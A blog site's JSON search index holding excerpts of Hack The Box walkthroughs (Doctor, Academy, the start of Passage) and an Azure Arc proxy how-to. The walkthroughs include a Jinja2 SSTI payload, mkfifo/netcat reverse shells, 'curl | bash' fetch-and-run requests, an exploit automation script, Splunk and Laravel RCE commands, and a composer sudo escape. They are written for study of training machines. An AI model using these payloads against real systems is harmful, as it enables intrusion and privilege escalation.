var store = [{
        "title": "Walktrough: HTB Doctor",
        "excerpt":"Hello everyone!   Starting to post about some write-ups of CTF-like machines, the first one will be Doctor, an easy-rated Linux box from Hack The Box created by egotisticalSW.   :information_source: Info: Write-ups for Hack The Box will be posted as soon as machines get retired, so here’s the first one :smiley:!      Enumeration   So let’s start with a quick enumeration of this box using Nmap. Running a quick scan we received the following output, where 2 HTTP services were found, alongside an SSH port:   nmap -sC -sV -Pn -oA quick 10.10.10.209 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 19:46 -03 Nmap scan report for 10.10.10.209 Host is up (0.17s latency). Not shown: 997 filtered ports PORT     STATE SERVICE  VERSION 22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA) |   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA) |_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519) 80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open  ssl/http Splunkd httpd | http-robots.txt: 1 disallowed entry  |_/ |_http-server-header: Splunkd |_http-title: splunkd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Not valid before: 2020-09-06T15:57:27 |_Not valid after:  2023-09-06T15:57:27 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.98 seconds                                                                              80 TCP - HTTP Service   Before starting the enumeration, checking the website using a browser, noticed that it is an institutional site, that mentions an e-mail info@doctors.htb, where the domain doctors.htb might be the FQDN of this machine.      To ensure proper enumeration of HTTP services that might be using DNS, changed local hosts file to reflect the correct name so we could also start enumerating the services.   $ sudo -i $ echo \" \" &gt;&gt; /etc/hosts $ echo \"# HTB Doctors\" &gt;&gt; /etc/hosts $ echo \"10.10.10.209 doctors.htb\" &gt;&gt; /etc/hosts $ cat /etc/hosts  127.0.0.1       localhost 127.0.1.1       kali  # The following lines are desirable for IPv6 capable hosts ::1     localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters   # HTB Doctors 10.10.10.209 doctors.htb   After changing the entry, once accessing the same URL, a different page is displayed, as seen below:      Now that we have confirmed that the box contained a different content being hosted using the DNS, we’ll start enumerating these websites using both ways so we can look for interesting opportunities for an initial foothold.   Whatweb   Checking whatweb for both sites noticed that the sites are hosted in different webservers, as seen below:      Via IP address: Apache[2.4.41], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], Email[info@doctors.htb], HTML5, Script, Bootstrap[4.3.1], JQuery[3.3.1]   Via DNS: HTTPServer[Werkzeug/1.0.1 Python/3.8.2], Cookies[session], Python[3.8.2], HttpOnly[session], Werkzeug[1.0.1], RedirectLocation[http://doctors.htb/login?next=%2F]   Manually enumerating the website   While checking the website I have noticed that on login page would be possible also to reset a password and create an account. The e-mail information we have (info@doctors.htb) was the first one tested but the error message was saying that the account doesn’t exist.   After some further testing, including checking the possibility to tamper with the change password request, I decided to change strategy and to try to create an account.      After having one successfully created, the warning below is displayed, which means that we’ll only have 20 minutes to use this recently created account.      After having the account created, started enumerating the source code where I’ve found a /archive folder hidden in the page, but it didn’t return anything when first accessed.    &lt;!--archive still under beta testing&lt;a class=\"nav-item nav-link\" href=\"/archive\"&gt;Archive&lt;/a&gt;--&gt;   So going further I noticed the possibility to add a new message, where I have created the following dummy content:      Accessing the posted message afterward, I noticed that it redirects to http://doctors.htb/post/2 but also nothing interesting besides the possibility of updating its content or deleting the message.   Manipulating the URL, to try to access the other posts, eg /post/1, there was a message from user admin but also didn’t take me anywhere else.   Things get interesting when I decided to access /archive again, where the content used in the message is displayed, allowing us to test some Server-Side Template Injection (SSTI) and possibly get a reverse shell.   To confirm this, following the guidance available on SSTI (Server Side Template Injection) - HackTricks I’ve changed the Title from my previous message to test some types of injections and determine the engine used, which will help us define the malicious injection itself.      This injection worked flawlessly, indicating that we’re handling Twig or Jinja2 :smile: (what makes sense, once this web service, as noticed on whatweb, is Werkzeug, a very popular web application server normally used with Flask or Django).      After a few tests, playing with the examples available at PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings (github.com), I was able to confirm that the correct language to use would be Jinja2, once the content below worked properly, among others:   {{config.items()}}   Initial Foothold   After confirming that a Jinja2 payload should be used, would be possible to get a reverse shell on the box using the following process:      In a folder in the attacker machine, created a payload file containing the string to be used as payload to get a reverse shell.   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f      Then host an HTTP server using python3 by running the command below from the same directory as the recently created file.   sudo python3 -m http.server 80      On the portal, created a post containing the following string on the title, obtained from the previously mentioned PayloadsAllTheThings site. This one especially is very interesting for this situation, which allows us to get the input parameter from the GET request, so we would be able to change the commands to be issued to the system very easily.   {% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}      Started listener using netcat by running the command below, selecting the same port defined in the payload file.   nc -lnvp 4443      Then made a request to the portal using the archive URL appended by the command I wanted to execute.   http://doctors.htb/archive?input=curl%20-L%20http://10.10.10.10/payload%20|%20bash      And voilà! A reverse shell was returned :smiley:      Bonus To make it easier to regain an initial foothold, once the user account has a short validity of 20 minutes, I’ve created this python3 script to help on this task :smiley:. To use it just set up the listener and python web server, then the script will recreate the user, the message and then send a request to get the reverse shell again   #!/usr/bin/python3  import requests  url = 'http://doctors.htb' username = 'dummy' password = 'P@ssw0rd' ip = '10.10.10.10' email = username+'@doctors.htb'  # Create new session s = requests.session()  # Make a initial request to get required cookies r = s.get(url)  # Create user payload = {'username':username,'email':email,'password':password,'confirm_password':password,'submit':'Sign Up'} r = s.post(url+'/register',data=payload)  # Login payload = {'email':email,'password':password,'submit':'Login'} r = s.post(url+'/login?next=%2Fhome',data=payload)  # Create message  title = \"{% for x in ().__class__.__base__.__subclasses__() %}{% if \\\"warning\\\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}\"  payload = {'title':title,'content':'content','submit':'Post'} r = s.post(url+'/post/new',data=payload)  # Get Reverse shell command = requests.utils.quote('curl -L http://'+ip+'/payload | bash') r = s.get(url+'/archive?input='+command)   User flag   After getting a reverse shell, I have upgraded it and then started to enumerate the box:           The existing users in this box, based on the enumeration of home folders are shaun and web            Checking the groups that the current user web is member, we notice that this account is a member of group adm       web@doctor:/home$ id uid=1001(web) gid=1001(web) groups=1001(web),4(adm)      The adm group on Linux systems grants access to files located at /var/log, which will possibly allow us to find some sensitive information in the logs from web services or other tasks.   Analyzing log files under /var/log   So to start this analysis let’s see which components, besides the system defaults, we have being logged on this box   web@doctor:/var/log$ ls -ld */ drwxr-x---  2 root              adm             4096 Jan 31 00:00 apache2/ drwxr-xr-x  2 root              root            4096 Sep  7 12:13 apt/ drwxr-xr-x  2 root              root            4096 Jan 31 00:00 cups/ drwxr-xr-x  2 root              root            4096 Apr  8  2020 dist-upgrade/ drwxr-xr-x  3 root              root            4096 Apr 23  2020 hp/ drwxrwxr-x  2 root              root            4096 Jul 26  2020 installer/ drwxr-sr-x+ 3 root              systemd-journal 4096 Jul 20  2020 journal/ drwxr-xr-x  2 root              root            4096 Sep  5  2019 openvpn/ drwx------  2 root              root            4096 Apr 23  2020 private/ drwx------  2 speech-dispatcher root            4096 Jan 19  2020 speech-dispatcher/ drwxr-x---  2 root              adm             4096 Jan 30 19:13 unattended-upgrades/   Starting with Apache2 logs, as this is one of the previously enumerated features and also considering the creation date of this box (so we can ignore the most recent information on it) we’ll have an interesting file, non-default, in this folder, which is a file called backup   web@doctor:/var/log/apache2$ ls -la | grep -v 'Jan 3' total 7980 -rw-r-----  1 root adm       1266 Sep  5 11:58 access.log.10.gz -rw-r-----  1 root adm        323 Aug 21 13:00 access.log.11.gz -rw-r-----  1 root adm        270 Aug 18 12:48 access.log.12.gz -rw-r--r--  1 root root   2194472 Jul 27  2020 access.log.13.gz -rw-r-----  1 root adm        668 Sep 28 15:02 access.log.2.gz -rw-r-----  1 root adm       1493 Sep 23 15:20 access.log.3.gz -rw-r-----  1 root adm       3951 Sep 22 12:58 access.log.4.gz -rw-r-----  1 root adm       1341 Sep 19 19:17 access.log.5.gz -rw-r-----  1 root adm     664054 Sep 15 14:27 access.log.6.gz -rw-r-----  1 root adm        384 Sep 14 10:07 access.log.7.gz -rw-r-----  1 root adm       3018 Sep  7 17:24 access.log.8.gz -rw-r-----  1 root adm       1338 Sep  6 22:46 access.log.9.gz -rw-r-----  1 root adm      21578 Sep 17 16:23 backup -rw-r-----  1 root adm        460 Sep 15 00:00 error.log.10.gz -rw-r-----  1 root adm        476 Sep  7 17:46 error.log.11.gz -rw-r-----  1 root adm        537 Sep  6 22:47 error.log.12.gz -rw-r-----  1 root adm        680 Sep  5 11:58 error.log.13.gz -rw-r-----  1 root adm        341 Sep  5 00:00 error.log.14.gz -rw-r-----  1 root adm        789 Sep 28 15:07 error.log.2.gz -rw-r-----  1 root adm       1092 Sep 23 15:42 error.log.3.gz -rw-r-----  1 root adm        846 Sep 22 13:03 error.log.4.gz -rw-r-----  1 root adm        655 Sep 22 10:40 error.log.5.gz -rw-r-----  1 root adm        352 Sep 19 00:00 error.log.6.gz -rw-r-----  1 root adm        424 Sep 18 00:00 error.log.7.gz -rw-r-----  1 root adm        428 Sep 17 00:00 error.log.8.gz -rw-r-----  1 root adm        629 Sep 16 00:00 error.log.9.gz -rw-r--r--  1 root root         0 Jul 27  2020 other_vhosts_access.log   Checking its contents, looking for the Query strings of the logged requests, we have observed an interesting entry, as below, which leaks a possible password Guitar123   web@doctor:/var/log/apache2$ awk -F\" \" '{print $7}' backup | sort | uniq / 12.1.2\\n\" 400 /evox/about /favicon.ico /.git/HEAD /HNAP1 /home /icons/ubuntu-logo.png /login /nmaplowercheck1599231606 /nmaplowercheck1599231646 /post/new /register /reset_password?email=Guitar123\" /robots.txt /sdk /static/main.css /static/profile_pics/default.gif   As the existing user in the box is shaun, trying to change user using this credential turned out to be successful, which allowed us to get the user flag:   shaun@doctor:~$ ls -la total 44 drwxr-xr-x 6 shaun shaun 4096 Sep 15 12:51 . drwxr-xr-x 4 root  root  4096 Sep 19 16:54 .. lrwxrwxrwx 1 root  root     9 Sep  7 14:31 .bash_history -&gt; /dev/null -rw-r--r-- 1 shaun shaun  220 Sep  6 16:26 .bash_logout -rw-r--r-- 1 shaun shaun 3771 Sep  6 16:26 .bashrc drwxr-xr-x 4 shaun shaun 4096 Sep 22 13:00 .cache drwx------ 4 shaun shaun 4096 Sep 15 11:14 .config drwx------ 4 shaun shaun 4096 Sep 15 11:57 .gnupg drwxrwxr-x 3 shaun shaun 4096 Sep  6 18:01 .local -rw-r--r-- 1 shaun shaun  807 Sep  6 16:26 .profile -rw-rw-r-- 1 shaun shaun   66 Sep 15 12:51 .selected_editor -r-------- 1 shaun shaun   33 Jan 30 19:12 user.txt shaun@doctor:~$ cat user.txt  &lt;redacted&gt;   Root flag   Now running as shaun, noticed that he’s unable to run commands using sudo.   shaun@doctor:/tmp$ sudo -l [sudo] password for shaun:  Sorry, user shaun may not run sudo on d   After running linpeas.sh from PEASS - Privilege Escalation Awesome Scripts SUITE the most prominent way to get a root shell should be through splunkd service, which is published through TCP 8089 as previously noticed on Nmap scans.   After browsing it directly, once I have clicked on the services link, as image below, an authentication prompt was shown. As the only credential we had is shaun it was the first one tried, which resulted in success :smiley:.         As we have credentials to log on to the Splunk Service, the next step is to find a way to get an RCE on this service. Doing some research I came across Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper’s Blog that mentions GitHub - cnotin/SplunkWhisperer2: Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations, which is a tool that makes easier to get a command execution from the access we already have.   After running the command below, was possible to obtain a reverse shell under root permissions:   $ python3 ./PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --payload \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f\" --lhost 10.10.10.10 Running in remote mode (Remote Code Execution) [.] Authenticating... [+] Authenticated [.] Creating malicious app bundle... [+] Created malicious app bundle in: /tmp/tmpcae79s9x.tar [+] Started HTTP server for remote mode [.] Installing app from: http://10.10.10.10:8181/ 10.10.10.209 - - [04/Feb/2021 19:46:38] \"GET / HTTP/1.1\" 200 - [+] App installed, your code should be running now!  Press RETURN to cleanup  [.] Removing app... [+] App removed [+] Stopped HTTP server Bye!   From the reverse shell obtained, was able to get the content from /root/root.txt without problems   # cat /root/root.txt &lt;redacted&gt;   I hope it was somehow useful!   See you in the next post! :smile:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Easy","HTB Linux"],
        "url": "/walkthrough/2021/02/htb-doctor",
        "teaser": "https://i.imgur.com/AXKMi8H.png"
      },{
        "title": "Walktrough: HTB Academy",
        "excerpt":"Hello everyone!   The box of this week will be Academy, another easy-rated Linux box from Hack the Box created by egre55 and mrb3n.   :information_source: Info: Write-ups for Hack the Box are always posted as soon as machines get retired.      Enumeration   Started the enumeration, as usual, by running Nmap quick scan to check what is running on this box.   $ nmap -sC -sV -Pn -oA quick 10.10.10.215 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 12:32 -03 Nmap scan report for 10.10.10.215 Host is up (0.15s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA) |   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA) |_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519) 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://academy.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 34.43 seconds                                     80 TCP - HTTP Service   Checking this service from Nmap scan, noticed that the page contains a redirect to the host academy.htb, which probably was not able to follow redirect once this domain name was not solved. After adding it to the /etc/hosts, we were able to navigate to the specified page which contains 2 links, one for registering and the other to login to this HTB Academy service.      As the page source did not disclose anything, proceeded by creating a dummy account (dummy:P@ssword) to get initial access to the platform but noticed something interesting in the post request, where a hidden field from the registration form was sending a parameter roleid, set to value 0.   POST /register.php HTTP/1.1 Host: academy.htb Content-Length: 57 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://academy.htb Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://academy.htb/register.php Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=amjdd7mhh764rbt4jvb0ujqa1i Connection: close  uid=dummy&amp;password=P%40ssw0rd&amp;confirm=P%40ssw0rd&amp;roleid=0   Let us proceed with the default value for now but we already have an idea of which parameters could be tampered with, if necessary.   After entering the recently created credentials, noticed that the user could see the academy catalog, with some pre-loaded credit but no operation (unlock) was possible once the unlock API (http://academy.htb/api/modules/unlock) was not available, returning an HTTP 404 error.      Gobuster   Once we came to a dead-end, let us see if we can brute force any path on this box that might lead us to a possible initial foothold. Running gobuster gave us 2 interesting pages to investigate further: admin.php and config.php.   gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://academy.htb -t 50 -o gobuster_80.txt -x php,html,txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url:            http://academy.htb [+] Threads:        50 [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes:   200,204,301,302,307,401,403 [+] Cookies:        PHPSESSID=amjdd7mhh764rbt4jvb0ujqa1i [+] User Agent:     gobuster/3.0.1 [+] Extensions:     txt,php,html [+] Timeout:        10s =============================================================== 2021/02/17 12:51:55 Starting gobuster =============================================================== /index.php (Status: 200) /images (Status: 301) /login.php (Status: 200) /home.php (Status: 200) /register.php (Status: 200) /admin.php (Status: 200) /config.php (Status: 200) Progress: 48339 / 220561 (21.92%)in.php (Status: 200)    admin.php   Accessing admin.php noticed that this pace looks very similar to the previous one, but our dummy credentials did not work there. So, remembering from the parameter we saw in the registration form (roleid), I decided to create another account but, in this case, tampering with the data sent in the request, replacing 0 by 1 for the mentioned identifier. With this new account, which roleid = 1, I was able to login to the restricted area and the page below was displayed:      Besides not existing any information hidden in the source code of this page, what called attention was the host dev-staging-01.academy.htb which might also be running in this box.   After adding it to the hosts file under the same IP, the page below was shown, which is an error handler framework for PHP, which allows developers to debug code in their code, but in this case, was open and leaking lots of information such as credentials and environment variables.      What most called attention to the information leaked was the MySQL credentials and Laravel App_key, which might lead us to an initial foothold in this box.   Initial Foothold   As we don’t have MySQL 3306/TCP open in this box, based on the initial nmap scan, searching a little about what could be done by using the Laravel App_key I came across the CVE-2018-15133 which can lead to RCE through an unserialized call in some affected Laravel versions. If we were lucky this might work for this box :smiley:.   Doing some search, I have found this repository that implements this exploit in a simple manner, which was the one I have used to get an initial foothold in the box.   python3 ./pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f\"   User flag   After upgrading the reverse shell, first thing to check was the content of the previously enumerated file config.php, listed below:   www-data@academy:/var/www/html$ cat ./academy/public/config.php  &lt;?php ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); $link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy'); ?&gt;   Connecting to the local instance of MySQL using the obtained credentials, noticed that there were some users created and their password hashes, that could be reused by one of the existing users of this box.   $ mysql -u root -p Password:  mysql&gt; use academy; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A  Database changed mysql&gt; select * from users; +----+----------+----------------------------------+--------+---------------------+ | id | username | password                         | roleid | created_at          | +----+----------+----------------------------------+--------+---------------------+ |  5 | dev      | a317f096a83915a3946fae7b7f035246 |      0 | 2020-08-10 23:36:25 | | 11 | test8    | 5e40d09fa0529781afd1254a42913847 |      0 | 2020-08-11 00:44:12 | | 12 | test     | 098f6bcd4621d373cade4e832627b4f6 |      0 | 2020-08-12 21:30:20 | | 13 | test2    | ad0234829205b9033196ba818f7a872b |      1 | 2020-08-12 21:47:20 | | 14 | tester   | 098f6bcd4621d373cade4e832627b4f6 |      1 | 2020-08-13 11:51:19 | +----+----------+----------------------------------+--------+---------------------+   After some research, found that these passwords were hashed using MD5 before storing in DB. Searching in some services online, the following passwords were retrieved:      dev: mySup3rP4s5w0rd!!   test8: test8   test: test   test2: test2   tester: test   Now that we have a few passwords, we need to check which user possibly has the user flag. By running the command below, we have identified user cry0l1t3 as the one we should test the obtained passwords so far:   www-data@academy:/home$ find /home -type f 2&gt;/dev/null | grep user.txt /home/cry0l1t3/user.txt   On the first try using mySup3rP4s5w0rd!! we were able to log in as cry0l1t3 and get the user flag   cry0l1t3@academy:~$ cat user.txt  &lt;redacted&gt;   Root flag   Now running as cry0l1t3, we can enumerate further this box. The first thing to do is to check his permissions. The user cry0l1t3 cannot run anything as root, based on sudo -l execution but he is a member of adm group, which allows us to read contents from /var/log which might leak some information.   cry0l1t3@academy:~$ sudo -l [sudo] password for cry0l1t3:  Sorry, user cry0l1t3 may not run sudo on academy. cry0l1t3@academy:~$ id uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)   Always when inspecting the logs from a CTF box, is important to consider its creation time, so all the other player registry entries can be ignored from the inspection. An easier way is to use the command below, which filters only files older than X days, in my case 100 which is the number of days since this box was released at the moment I am solving it.   find /var/log -mtime +100 -print 2&gt;/dev/null   Checking first the apache logs, nothing interesting was found by inspecting the access logs, so the most interesting in sequence are the audit logs and then any cron execution.   Checking the audit logs, we can see 2 files matching the mentioned period, which will later be inspected.   cry0l1t3@academy:~$ find . -mtime +100 -print 2&gt;/dev/null | grep audit /var/log/audit/audit.log.2 /var/log/audit/audit.log.3   Looking for interesting commands on then (sudo, su, passwd) that could possibly leak some information, I was lucky to find one occurrence of su:   cry0l1t3@academy:~$ cat /var/log/audit/audit.log.[2-3] | grep '\"su\"' type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=\"su\" data=6D7262336E5F41634064336D79210A   The data field contains the HEX value of the parameter used in the execution, which can be converted to text. You can use any converter online, but you can also use vim for this task, as described below:      Open a file in edit mode using vim   vim /tmp/test           Type Esc to enter em command mode and enter the command :% !xxd. This will convert the existing content into HEX            Now pressing i we’ll enter in Insert Mode and paste the HEX content we want to convert, right after 00000000:.            Press Esc again to return to command mode and type :% !xxd -r to return to the actual content to ASCII.            You can later save and exit by entering the command :wq!  but you might have also seen the actual content of this HEX value. Below is the output of the file I’ve created to do this conversion:       cat /tmp/test                     mrb3n_Ac@d3my!   As mrb3n is one of the other users of this box this could probably be his password, which was confirmed by running su mrb3n and typing the password found.   Enumerating his permissions, noticed that he’s not member of any special group but has sudo privileges to run composer   mrb3n@academy:~$ id uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n) mrb3n@academy:~$ sudo -l [sudo] password for mrb3n:  Matching Defaults entries for mrb3n on academy:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User mrb3n may run the following commands on academy:     (ALL) /usr/bin/composer   Abusing sudo permissions   Checking on GTFOBins is possible to escalate privileges by using composer running the snippet below, which worked without issues:   TF=$(mktemp -d) echo '{\"scripts\":{\"x\":\"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3\"}}' &gt;$TF/composer.json sudo composer --working-dir=$TF run-script x   As root, finally obtained the flag under /root/root.txt   root@academy:~# id uid=0(root) gid=0(root) groups=0(root) root@academy:~# cat root.txt  &lt;redacted&gt; root@academy:~#   I hope you have enjoyed this box resolution!   See you next time! :smiley:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Easy","HTB Linux"],
        "url": "/walkthrough/2021/02/htb-academy",
        "teaser": "https://i.imgur.com/fq8Np1C.png"
      },{
        "title": "Azure Arc enabled Servers: Service-level proxy configuration on Linux",
        "excerpt":"Sometimes customers ask for help to configure proxy for internet services in some specific services, and this is no different with Azure Arc   In this post, I’ll guide you on how to configure this for Linux, without configuring system-wide.   Default configuration   By default, when we specify a proxy server during the Azure Arc agent installation in a Linux Server, there’s a utility that handles all these requests, which is azcmagent_proxy, as below:   dcruz@vmlx02:~$ sudo azcmagent_proxy Usage:  azcmagent_proxy add &lt;URL&gt; - to add URL as the proxy         azcmagent_proxy remove - to delete configured proxy dcruz@vmlx02:~$   When we define the proxy using it, two files are changed, as we can see in the example below:   dcruz@vmlx02:~$ sudo azcmagent_proxy add http://vmlx01:3128     No proxy previously configured Removing proxy environment variable from file:  /opt/azcmagent/bin/azcmagent     No proxy previously configured Setting proxy environment variable to file:  /lib/systemd/system.conf.d/proxy.conf Adding proxy environment variable to file:  /opt/azcmagent/bin/azcmagent dcruz@vmlx02:~$   The first file, /lib/systemd/system.conf.d/proxy.conf, defines the proxy to all systemd daemons globally, while the /opt/azcmagent/bin/azcmagent is the wrapper for the Azure Arc command line utility.   Changing proxy settings only for Azure Arc   To configure the services to have connectivity needed to perform all management tasks, without enabling it system-wide, is necessary to change each of the systemd unity files, as described below;      If you have already configured proxy using azcmagent_proxy during the setup and desire to roll back its configurations, is necessary to run it again to do the task:   sudo azcmagent_proxy remove      Also, for each service unity used by Azure Arc for Linux Servers (himdsd.service,gcad.service,extd.service) located at /lib/systemd/system, we need to add a variable in the section [Service] defining https_proxy, as the example below and can also be seen in the official systemd documentation:   [Service] # [...] Environment=https_proxy=http://vmlx01:3128      After changing all the three mentioned files, run the commands below to reload daemons and restart the services   sudo systemctl daemon-reexec sudo systemctl restart extd.service himdsd.service gcad.service      Also is necessary to add the proxy to the azcmagent wrapper, to make the command azcmagent connect work properly in the system. This is achieved y adding a line export https_proxy=&lt;proxyserver&gt; right below the commented message that a specific line should not be removed in the file located at /opt/azcmagent/bin/azcmagent, as the sample below:   [...]  # Do not remove this line ==== place Environment Variables below ====== export https_proxy=http://vmlx01:3128  [...]   After making these changes, you should see the following line on your logs, which is proof that the service is using the correct proxy configuration inside the  /var/opt/azcmagent/log/himds.log   time=\"yyyy-MM-dd02T17:34:07Z\" level=debug msg=\"Using Https Proxy: http://vmlx01:3128\"   At this point, you’re ready to manage this endpoint using Azure Arc or connect it using the command azcmagent connect in case it is a new install.   Script   To simplify configuration, I’ve created one script inspired on azcmagent_proxy to automate this configuration for Linux distributions using systemd, available at Security/azcmagent_proxydaemon.sh at main · davi-cruz/Security (github.com).   This could be useful to you not only to define proxy settings for Azure Arc enabled Linux Servers but also for any service unities you run in your workloads :smile:   :warning: Alert: As these changes are not global, other services installed by using Azure Extensions (Native or Custom ones) might require additional changes to make them work with the default proxy or to also make the same configuration to their services.   HTH!  ","categories": ["Azure Arc"],
        "tags": ["Azure","Azure Arc","Linux"],
        "url": "/azure-arc/2021/03/azure-arc-enabled-servers-service-level-proxy-configuration-on-linux",
        "teaser": "https://i.imgur.com/faH4EDJ.png"
      },{
        "title": "Walktrough: HTB Passage",
        "excerpt":"Hello everyone!   The box of this week will be Passage, a medium-rated Linux box from Hack The Box created by ChefByzen.   :information_source: Info: Write-ups for Hack The Box are always posted as soon as machines get retired.      Enumeration   Started the enumeration, as usual, by running nmap quick scan to check what is running on this box.   $ nmap -sC -sV -Pn -oA quick 10.10.10.206 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 12:58 -03 Nmap scan report for 10.10.10.206 Host is up (0.077s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) |   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) |_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/  Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds   80/TCP - HTTP Service   Accessing the web page noticed that it is a blog built using CuteNews and the first post is very interesting, mentioning that Fail2Ban was recently implemented. This will prevent us from using any kind of brute force enumeration (dirbuster and related tools/techniques).      Inspecting the source code of the page, while searching for interesting links, found some e-mail addresses, besides the passage.htb domain, which was added to the local hosts file.   $ curl -L http://10.10.10.206 | grep -Eo 'href=\"(.*)\"' | grep -v 'index.php' | sort -u   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed 100 11085    0 11085    0     0  68006      0 --:--:-- --:--:-- --:--:-- 68006 href=\"CuteNews/libs/css/cosmo.min.css\" rel=\"stylesheet\" href=\"CuteNews/libs/css/font-awesome.min.css\" rel=\"stylesheet\" href=\"CuteNews/rss.php\"&gt;&lt;img src=\"CuteNews/skins/images/rss_icon.gif\" alt=\"RSS\" href=\"http://cutephp.com/\" title=\"CuteNews - PHP News Management System\" style=\"font:9px Verdana!important;display:inline!important;visibility:visible!important;color:#003366!important;text-indent: 0px!important;\" href=\"mailto:kim@example.com\" href=\"mailto:nadav@passage.htb\" href=\"mailto:paul@passage.htb\" href=\"mailto:sid@example.com\"   After some research about the product, found the administration page at http://passage.htb/CuteNews where I could identify the running version, which is 2.1.2.      Initial Foothold   Checking existing exploits for this product version, found 4 alternatives in searchsploit where I’ve used the last one, 48800,  to which I also needed to make some adjustments.   searchsploit cutenews 2.1.2 ---------------------------------------------------------------------- ---------------------------------  Exploit Title                                                        |  Path ---------------------------------------------------------------------- --------------------------------- CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)          | php/remote/46698.rb CuteNews 2.1.2 - Arbitrary File Deletion                              | php/webapps/48447.txt CuteNews 2.1.2 - Authenticated 